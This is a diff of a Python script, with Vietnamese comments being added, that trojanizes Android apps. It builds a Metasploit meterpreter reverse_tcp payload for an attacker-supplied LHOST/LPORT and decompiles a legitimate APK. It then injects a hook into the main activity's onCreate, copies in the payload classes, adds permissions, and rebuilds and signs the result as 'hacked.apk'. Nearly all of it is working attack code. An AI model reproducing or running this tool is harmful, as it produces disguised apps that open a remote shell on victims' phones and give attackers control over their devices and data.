@@ -3,11 +3,12 @@
 import os
 
 def directoryTraversal(appname, activity):
-    os.system("ls -1 " + appname +"/ | grep smali > ls")
+    os.system("ls -1 " + appname +"/ | grep smali > ls") # Tìm các file smali trong thư mục
 
-    f = open("ls","r").read()
+    f = open("ls","r").read() # ĐỌc file smali
     path = None
 
+    # In các file activity để duyệt tìm main activivity
     for i in f.split("\n"):
         print(i)
         if os.path.isfile(appname + "/" + i + "/" + activity + ".smali"):
@@ -45,6 +46,7 @@ permission = """    <uses-permission android:name="android.permission.INTERNET"/
 
 def main():
     
+    #Nhập vào các argument LHOST, LPORT, tên file APK để tạo payload
     lhost = input("LHOST: ")
     lport = input("LPORT: ")
     apk = input("APK file: ")
@@ -52,24 +54,24 @@ def main():
     print("Creating payload...")
     os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o payload.apk".format(lhost,lport))
 
-
+    # Disasembly các file APK
     os.system("apktool d -f payload.apk")
     os.system("apktool d -f " + apk)
 
+    # ĐỌc file androidmanifest.xml
     manifest = open(apk[:-4]+"/AndroidManifest.xml","r").read()
 
+    # Tìm main laucher trong AndroidManifest.xml 
     line = 0
-
     for i in manifest.split("\n"):
         if i.find("action.MAIN") != -1:
-            
             if manifest.split("\n")[line+1].find("LAUNCHER") != -1:
                 break
             else:
                 continue
-        
         line += 1
 
+    # Từ main laucher tìm được main activity
     for i in range(1, 10):
         activity = manifest.split("\n")[line-i:line]
         if activity[0].find("activity") != -1:
@@ -99,6 +101,7 @@ def main():
         print("Main activity not found!")
         exit()
 
+    # Tìm vị trí để tạo hook cho thư mục payload. Đó chính là vị trí của onCreate method
     f = open(path,"r").read()
     line = 0
     for i in f.split("\n"):
@@ -106,20 +109,23 @@ def main():
             break
         line += 1
 
+    # Chèn Hook vào 
     f = f.split("\n")
     f[line] = f[line] + "\n\n    invoke-static {p0}, Lcom/payload/stage/Payload;->start(Landroid/content/Context;)V"
     f = '\n'.join(f)
 
+    # Copy payload của metasploit vào trong thư mục smali của file APK
     f=open(path,"w").write(f)
     os.system("mkdir -p " + apk[:-4] + "/" + path.split("/")[1] +"/com/payload/stage/")
     os.system("sed -i -e 's/metasploit/payload/g' payload/smali/com/metasploit/stage/*")
     os.system("cp payload/smali/com/metasploit/stage/* " + apk[:-4] + "/" + path.split("/")[1] + "/com/payload/stage/")
-    f=open(apk[:-4] + "/AndroidManifest.xml","r").read()
-    
-    line = 0
 
+    # Mở thêm permission vào trong file AndroidManifest.xml
+    f=open(apk[:-4] + "/AndroidManifest.xml","r").read()
+    line = 0
     f = f.split("\n")
     e = 0
+    # Nếu gặp permission nào trùng thì xoá
     for a in f:
         for b in permission.split("\n"):
             if a.find(b) != -1:
@@ -128,13 +134,15 @@ def main():
                     l = line-1
                     e = 1              
         line += 1
-
+    # Thêm permission 
     f[l] = f[l] + "\n" + permission
     f = '\n'.join(f)
 
     f = open(apk[:-4] + "/AndroidManifest.xml","w").write(f)
 
+    # Cuối cùng build lại file với apktool
     os.system("apktool b " + apk[:-4]+ " -o hacked.apk")
+    # Và kí vào ứng dụng với key đã tạo.
     os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore madtik.keystore hacked.apk madtik")
 
 if __name__ == "__main__":
